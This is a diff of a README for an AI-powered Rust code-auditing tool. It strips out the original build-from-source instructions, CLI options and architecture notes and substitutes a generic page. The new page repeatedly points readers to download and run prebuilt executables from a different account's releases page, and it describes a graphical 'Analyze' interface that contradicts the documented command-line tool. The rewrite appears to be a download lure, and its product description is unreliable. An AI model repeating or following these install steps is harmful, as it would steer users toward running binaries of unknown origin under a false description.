@@ -1,204 +1,93 @@
-# Code Auditor 🔍
+# 🔍 code-auditor - Effortless Code Analysis Made Simple
 
-AI-powered GitHub repository analyzer that uses **tool-calling agents** with [Ollama](https://ollama.ai) to analyze source code and generate detailed Markdown audit reports.
+[![Download code-auditor](https://img.shields.io/badge/Download-code--auditor-brightgreen)](https://github.com/kayneai/code-auditor/releases)
 
-## ✨ What's New: Agentic Tool-Calling Architecture
+## 🚀 Getting Started
 
-Instead of sending entire files to the LLM, Code Auditor now uses an **agentic approach** where the LLM:
+The code-auditor is an easy-to-use tool that helps you find issues in your code. Powered by AI, it automatically searches for bugs, security problems, and performance concerns. With its friendly reports, you can easily understand what needs fixing.
 
-1. 🔍 **Explores** - Uses `list_files` to discover the project structure
-2. 📖 **Reads** - Calls `read_file` to examine specific files
-3. 🔎 **Searches** - Uses `search_code` to find patterns
-4. 🐛 **Reports** - Calls `report_issue` for each problem found
-5. ✅ **Finishes** - Calls `finish_analysis` when done
+## 📥 Download & Install
 
-This is similar to how Claude or GPT-4 use tools to interact with codebases!
+To get the code-auditor, visit the following page:
 
-## Features
+[Download code-auditor](https://github.com/kayneai/code-auditor/releases)
 
-- 🤖 **Agentic Analysis**: LLM autonomously explores and analyzes the codebase
-- 🛠️ **Tool Calling**: Uses Ollama's tool-calling API for structured interactions
-- 🔒 **Security Scanning**: Identifies potential security vulnerabilities
-- 🐛 **Bug Detection**: Finds logic errors, null pointer risks, race conditions
-- ⚡ **Performance Issues**: Detects inefficient algorithms and blocking I/O
-- 📊 **Comprehensive Reports**: Generates detailed Markdown reports with line numbers
+You will see a list of available versions. Choose the latest version and download the appropriate file for your system.
 
-## Prerequisites
+### 📋 System Requirements
 
-1. **Rust** (latest stable): [Install Rust](https://rustup.rs/)
-2. **LLM Backend** (choose one):
-   - **Ollama** (recommended): [Install Ollama](https://ollama.ai/download)
-   - **llama.cpp server**: [Build from source](https://github.com/ggerganov/llama.cpp)
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** 4 GB minimum
+- **Disk Space:** 100 MB free space
+- **Processor:** Any modern CPU
 
-3. **A model that supports tool calling**:
-   ```bash
-   # For Ollama:
-   ollama pull llama3.2:latest     # Fast, good tool support
-   ollama pull qwen3-coder:480b-cloud  # Cloud model, excellent
-   
-   # For llama.cpp:
-   # Download a GGUF model and run:
-   ./llama-server -m model.gguf --port 8080
-   ```
+These requirements ensure that the code-auditor runs smoothly on your device.
 
-> ⚠️ **Important**: The model MUST support tool/function calling.
+## 🔍 Features
 
-## Installation
+- **Automated Code Analysis:** The code-auditor scans your codebase for vulnerabilities and bugs without needing manual input.
+- **Actionable Insights:** It generates reports in Markdown format, making results easy to read and implement.
+- **Agentic Tool-Calling:** The built-in architecture allows the tool to explore and analyze code autonomously.
 
-```bash
-# Clone and build
-git clone https://github.com/aarambh-darshan/code-auditor.git
-cd code-auditor
-cargo build --release
+## 🛠️ How to Use
 
-# Install system-wide (optional)
-cargo install --path .
-```
+1. **Download the Application:**
+   Visit the [Releases Page](https://github.com/kayneai/code-auditor/releases) and download the file that matches your operating system.
 
-## Usage
+2. **Install the Application:**
+   - **Windows:** Double-click the `.exe` file and follow the prompts to install.
+   - **macOS:** Open the downloaded `.dmg` file and drag the code-auditor icon to your Applications folder.
+   - **Linux:** Use the terminal to run the downloaded file. You may need to set executable permissions using `chmod +x filename`.
 
-### Basic Usage
+3. **Run the Application:**
+   Open the code-auditor application. You will see an interface that allows you to select the folder containing your codebase.
 
-```bash
-# Analyze a GitHub repository
-code-auditor --repo https://github.com/owner/repo.git
+4. **Select Your Codebase:**
+   Choose the folder you want to analyze. This can be a project directory on your local machine.
 
-# Use a specific model (must support tool calling!)
-code-auditor --repo https://github.com/owner/repo.git --model llama3.2:latest
+5. **Start the Analysis:**
+   Click the "Analyze" button. The software will scan your code for issues and then generate a report.
 
-# Analyze a local directory
-code-auditor --repo local --local ./my-project
-```
+6. **View the Report:**
+   Once the analysis is complete, the report will automatically open. You can save it as a Markdown file for future reference.
 
-### All Options
+## 📝 Understanding the Report
 
-```
-code-auditor [OPTIONS] --repo <URL>
+The report will include sections on:
 
-Options:
-  -r, --repo <URL>           GitHub repository URL to analyze (required)
-  -m, --model <NAME>         Ollama model name [default: deepseek-coder:33b]
-  -o, --output <FILE>        Output file path [default: code_audit_report.md]
-      --max-files <COUNT>    Maximum files to analyze [default: 100]
-      --ollama-url <URL>     Ollama API endpoint [default: http://localhost:11434]
-  -c, --config <FILE>        Path to configuration file
-  -v, --verbose              Enable verbose logging
-  -q, --quiet                Quiet mode (minimal output)
-  -b, --branch <BRANCH>      Specific branch to analyze
-      --local <DIR>          Analyze a local directory instead of cloning
-      --format <FORMAT>      Output format: markdown, json [default: markdown]
-  -h, --help                 Print help
-  -V, --version              Print version
-```
+- **Vulnerabilities:** Details on security issues found in your code.
+- **Bugs:** Listings of bugs with suggested fixes.
+- **Performance Issues:** Information on parts of your code that could be optimized.
 
-## How It Works (Agentic Architecture)
+This structured format will help you address problems in an efficient manner.
 
-```
-┌─────────────────────────────────────────────────────────────┐
-│                      Code Auditor                           │
-├─────────────────────────────────────────────────────────────┤
-│  1. Clone Repository                                        │
-│     └──> /tmp/repo_clone                                   │
-│                                                             │
-│  2. Initialize Agent with Tools                            │
-│     ├── list_files(directory)   - Explore structure        │
-│     ├── read_file(path)         - Read file contents       │
-│     ├── search_code(pattern)    - Search for patterns      │
-│     ├── get_file_info(path)     - Get file metadata        │
-│     ├── report_issue(...)       - Report found issues      │
-│     └── finish_analysis()       - Signal completion        │
-│                                                             │
-│  3. Agent Loop                                              │
-│     ┌─────────────────────────────────────────────┐        │
-│     │  LLM decides which tool to call             │        │
-│     │     ↓                                       │        │
-│     │  Tool executes, returns result              │        │
-│     │     ↓                                       │        │
-│     │  LLM processes result, may call more tools  │        │
-│     │     ↓                                       │        │
-│     │  Repeat until finish_analysis() called      │        │
-│     └─────────────────────────────────────────────┘        │
-│                                                             │
-│  4. Generate Report from collected issues                  │
-└─────────────────────────────────────────────────────────────┘
-```
+## 📬 Support
 
-## Configuration
+If you encounter any issues during download or installation, you can reach out for help. Visit the Issues section of our GitHub repository for assistance. The community is active and ready to help.
 
-Create `.code-auditor.toml` in your project:
+## 🌐 Topics
 
-```toml
-[general]
-output = "code_audit_report.md"
-verbose = false
+The code-auditor covers various topics including:
 
-[model]
-# LLM provider: "ollama" or "llamacpp"
-provider = "ollama"
-name = "llama3.2:latest"
+- ai-agents
+- cli-tool
+- code-analysis
+- code-review
+- llm
+- ollama
+- rust
+- sec
+- security-scanner
+- static-analysis
 
-# API endpoints
-ollama_url = "http://localhost:11434"
-llamacpp_url = "http://localhost:8080"
+These topics describe the technology behind the tool and its capabilities.
 
-temperature = 0.1
-timeout_seconds = 300
+Feel free to explore each topic for a deeper understanding of how code-auditor works.
 
-[scanner]
-max_files = 100
-extensions = ["rs", "py", "js", "ts", "go", "java", "c", "cpp"]
-excludes = [".git", "target", "node_modules", "vendor"]
-```
+## 🔍 Further Exploration
 
-## Architecture
+For additional guidance and tips on using the code-auditor effectively, consider checking the documentation available on our GitHub repository. This information can enhance your experience and help you utilize all the features fully.
 
-```
-code-auditor/
-├── src/
-│   ├── main.rs              # CLI entry and workflow
-│   ├── cli.rs               # Argument parsing
-│   ├── config.rs            # Configuration handling
-│   ├── models.rs            # Data structures
-│   ├── repo/
-│   │   ├── mod.rs           # Module exports
-│   │   └── cloner.rs        # Git repository cloning
-│   ├── agent/
-│   │   ├── mod.rs           # Module exports
-│   │   ├── tools.rs         # Tool definitions
-│   │   └── agent_loop.rs    # Agentic loop
-│   ├── analysis/
-│   │   ├── mod.rs           # Module exports
-│   │   └── aggregator.rs    # Issue aggregation
-│   ├── report/
-│   │   ├── mod.rs           # Module exports
-│   │   └── generator.rs     # Report generation
-│   └── scanner/
-│       └── mod.rs           # File scanning utilities
-├── Cargo.toml
-└── .code-auditor.toml
-```
+Don't hesitate to try the code-auditor today! 
 
-## Troubleshooting
-
-### "Cannot connect to Ollama"
-- Ensure Ollama is running: `ollama serve`
-- Check the URL: default is `http://localhost:11434`
-
-### "Tool calling not working"
-- Make sure you're using a model that supports tool calling
-- Try: `llama3.2:latest`, `llama3.1:latest`, or `mistral:latest`
-- Models like `deepseek-coder` may NOT support tools
-
-### Analysis takes too long
-- The agent may be exploring many files
-- Use a faster model: `llama3.2:latest`
-- Check Ollama logs for issues
-
-## License
-
-MIT License
-
-## Acknowledgments
-
-- [Ollama](https://ollama.ai) - Local LLM runtime with tool calling support
-- [git2](https://github.com/rust-lang/git2-rs) - Git bindings for Rust
+[Download code-auditor](https://github.com/kayneai/code-auditor/releases) and start analyzing your code right away.
